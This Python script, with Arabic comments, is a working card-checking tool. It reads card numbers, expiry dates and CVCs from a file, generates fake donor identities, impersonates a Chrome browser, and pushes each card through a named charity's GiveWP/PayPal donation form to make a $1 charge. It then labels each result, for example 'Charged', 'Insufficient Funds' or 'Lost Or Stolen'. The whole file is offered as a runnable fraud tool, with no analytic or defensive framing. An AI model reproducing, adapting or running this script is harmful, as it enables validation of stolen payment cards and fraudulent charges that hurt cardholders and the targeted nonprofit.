import base64
import json
import re
import secrets
from faker import Faker
from curl_cffi import requests

# إنشاء جلسة curl_cffi ومحاكاة متصفح كروم 124
r = requests.Session(impersonate="chrome124")
fake = Faker("en_UK")

with open("b.txt", "r") as file:
    for line in file:
        card = line.strip()
        if not card:
            continue

        parts = card.split("|")
        n = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3]

        f = fake.first_name()
        l = fake.last_name()
        k = f"{f} {l}"
        e = f"{f.lower()}.{l.lower()}@gmail.com"

        token = secrets.token_hex(16)
        print("Client Metadata ID:", token)

        # ------------------------------------------------------------------
        # Step 1: GET Donation Page
        # المحذوف: كافة الهيدرز التلقائية
        # ------------------------------------------------------------------
        response = r.get("https://bukjeh.org/donations/donation-2023-2-3/")

        hash_match = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
        pre_match = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
        give_match = re.search(r'name="give-form-id" value="(.*?)"', response.text)
        enc_match = re.search(r'"data-client-token":"(.*?)"', response.text)

        if not (hash_match and pre_match and give_match and enc_match):
            print("❌ Failed to parse initial parameters from HTML page.")
            continue

        hash_val = hash_match.group(1)
        pre = pre_match.group(1)
        give = give_match.group(1)
        enc = enc_match.group(1)

        dec = base64.b64decode(enc).decode("utf-8")
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)

        print("give-form-hash:", hash_val)
        print("give-form-id-prefix:", pre)
        print("give-form-id:", give)
        print("accessToken:", au[:15] + "...")

        # ------------------------------------------------------------------
        # Step 2: AJAX Process Donation
        # الضروري فقط: origin, referer, content-type, x-requested-with
        # ------------------------------------------------------------------
        headers_step2 = {
            "origin": "https://bukjeh.org",
            "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
            "x-requested-with": "XMLHttpRequest",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        }

        data_step2 = {
            "give-fee-amount": "0",
            "give-fee-mode-enable": "false",
            "give-fee-status": "enabled",
            "give-honeypot": "",
            "give-form-id-prefix": pre,
            "give-form-id": give,
            "give-form-title": "Help us make A’amar",
            "give-current-url": "https://bukjeh.org/donations/donation-2023-2-3/",
            "give-form-url": "https://bukjeh.org/donations/donation-2023-2-3/",
            "give-form-minimum": "1.00",
            "give-form-maximum": "999999.99",
            "give-form-hash": hash_val,
            "give-price-id": "3",
            "give-recurring-logged-in-only": "",
            "give-logged-in-only": "1",
            "_give_is_donation_recurring": "0",
            "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
            "give-amount": "1.00",
            "give-recurring-period-donors-choice": "month",
            "payment-mode": "paypal-commerce",
            "give_first": f,
            "give_last": l,
            "give_email": e,
            "card_name": k,
            "card_exp_month": "",
            "card_exp_year": "",
            "give_action": "purchase",
            "give-gateway": "paypal-commerce",
            "action": "give_process_donation",
            "give_ajax": "true",
        }

        response = r.post(
            "https://bukjeh.org/wp-admin/admin-ajax.php",
            headers=headers_step2,
            data=data_step2,
        )

        # ------------------------------------------------------------------
        # Step 3: Create PayPal Order
        # الضروري فقط: origin, referer
        # (Content-Type يتم إنشاؤه تلقائياً بصيغة multipart عند استخدام files)
        # ------------------------------------------------------------------
        headers_step3 = {
            "origin": "https://bukjeh.org",
            "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
        }

        params_step3 = {"action": "give_paypal_commerce_create_order"}

        files_step3 = {
            "give-fee-amount": (None, "0"),
            "give-fee-mode-enable": (None, "false"),
            "give-fee-status": (None, "enabled"),
            "give-honeypot": (None, ""),
            "give-form-id-prefix": (None, pre),
            "give-form-id": (None, give),
            "give-form-title": (None, "Help us make A’amar"),
            "give-current-url": (None, "https://bukjeh.org/donations/donation-2023-2-3/"),
            "give-form-url": (None, "https://bukjeh.org/donations/donation-2023-2-3/"),
            "give-form-minimum": (None, "1.00"),
            "give-form-maximum": (None, "999999.99"),
            "give-form-hash": (None, hash_val),
            "give-price-id": (None, "3"),
            "give-recurring-logged-in-only": (None, ""),
            "give-logged-in-only": (None, "1"),
            "_give_is_donation_recurring": (None, "0"),
            "give_recurring_donation_details": (None, '{"give_recurring_option":"yes_donor"}'),
            "give-amount": (None, "1.00"),
            "give-recurring-period-donors-choice": (None, "month"),
            "give_stripe_payment_method": (None, ""),
            "payment-mode": (None, "paypal-commerce"),
            "give_first": (None, f),
            "give_last": (None, l),
            "give_email": (None, e),
            "card_name": (None, k),
            "card_exp_month": (None, ""),
            "card_exp_year": (None, ""),
            "give-gateway": (None, "paypal-commerce"),
        }

        response = r.post(
            "https://bukjeh.org/wp-admin/admin-ajax.php",
            params=params_step3,
            headers=headers_step3,
            files=files_step3,
        )

        try:
            order_id = response.json()["data"]["id"]
            print("Order ID:", order_id)
        except Exception:
            print("❌ Failed to retrieve order ID.")
            continue

        # ------------------------------------------------------------------
        # Step 4: PayPal Confirm Payment Source
        # الضروري فقط: authorization, braintree-sdk-version, content-type, origin, paypal-client-metadata-id, referer
        # ------------------------------------------------------------------
        headers_step4 = {
            "authorization": f"Bearer {au}",
            "braintree-sdk-version": "3.32.0-payments-sdk-dev",
            "content-type": "application/json",
            "origin": "https://assets.braintreegateway.com",
            "paypal-client-metadata-id": token,
            "referer": "https://assets.braintreegateway.com/",
        }

        json_data_step4 = {
            "payment_source": {
                "card": {
                    "number": n,
                    "expiry": f"20{yy}-{mm}",
                    "security_code": cvc,
                    "attributes": {
                        "verification": {
                            "method": "SCA_WHEN_REQUIRED",
                        },
                    },
                },
            },
            "application_context": {
                "vault": False,
            },
        }

        response = r.post(
            f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
            headers=headers_step4,
            json=json_data_step4,
        )

        # ------------------------------------------------------------------
        # Step 5: Approve Order
        # الضروري فقط: origin, referer
        # ------------------------------------------------------------------
        headers_step5 = {
            "origin": "https://bukjeh.org",
            "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
        }

        params_step5 = {
            "action": "give_paypal_commerce_approve_order",
            "order": order_id,
        }

        response = r.post(
            "https://bukjeh.org/wp-admin/admin-ajax.php",
            params=params_step5,
            headers=headers_step5,
            files=files_step3,
        )

        text = response.text
        status = "UNKNOWN_ERROR"

        if "true" in text or "sucsess" in text:
            status = "Charged - $1 !"
        elif "DO_NOT_HONOR" in text:
            status = "Do Not Honor"
        elif "ACCOUNT_CLOSED" in text:
            status = "Account Closed"
        elif "PAYER_ACCOUNT_LOCKED_OR_CLOSED" in text:
            status = "Payer Account Locked Or Closed"
        elif "LOST_OR_STOLEN" in text:
            status = "Lost Or Stolen"
        elif "CVV2_FAILURE" in text:
            status = "CVV2_FAILURE"
        elif "SUSPECTED_FRAUD" in text:
            status = "Suspected Fraud"
        elif "INVALID_ACCOUNT" in text:
            status = "Invalid Account"
        elif "REATTEMPT_NOT_PERMITTED" in text:
            status = "Reattempt Not Permitted"
        elif "ACCOUNT_BLOCKED_BY_ISSUER" in text:
            status = "Account Blocked By Issuer"
        elif "ORDER_NOT_APPROVED" in text:
            status = "Order Not Approved"
        elif "PICKUP_CARD_SPECIAL_CONDITIONS" in text:
            status = "Pick Card Special Conditions"
        elif "PAYER_CANNOT_PAY" in text:
            status = "Payer Cannot Pay"
        elif "INSUFFICIENT_FUNDS" in text:
            status = "Insufficient Funds"
        elif "GENERIC_DECLINE" in text:
            status = "Generic Decline"
        elif "COMPLIANCE_VIOLATION" in text:
            status = "Compliance Violation"
        elif "TRANSACTION_NOT_PERMITTED" in text:
            status = "Transaction Not Permitted"
        elif "PAYMENT_DENIED" in text:
            status = "Payment Denied"
        elif "INVALID_TRANSACTION" in text:
            status = "Invalid Transaction"
        elif "RESTRICTED_OR_INACTIVE_ACCOUNT" in text:
            status = "Restricted Or Inactive Account"
        elif "SECURITY_VIOLATION" in text:
            status = "Security Violation"
        elif "DECLINED_DUE_TO_UPDATED_ACCOUNT" in text:
            status = "Declined Due To Update Account"
        elif "INVALID_OR_RESTRICTED_CARD" in text:
            status = "Invalid Or Restricted Card"
        elif "EXPIRED_CARD" in text:
            status = "Expired Card"
        elif "CRYPTOGRAPHIC_FAILURE" in text:
            status = "CRYPTOGRAPHIC_FAILURE"
        elif "TRANSACTION_CANNOT_BE_COMPLETED" in text:
            status = "TRANSACTION_CANNOT_BE_COMPLETED"
        elif "DECLINED_PLEASE_RETRY" in text:
            status = "DECLINED_PLEASE_RETRY_LATER"
        elif "TX_ATTEMPTS_EXCEED_LIMIT" in text:
            status = "TX_ATTEMPTS_EXCEED_LIMIT"
        else:
            try:
                error_data = json.loads(text)
                status = error_data["data"]["error"]
            except Exception:
                status = "UNKNOWN_ERROR"

        print("Final Status:", status)
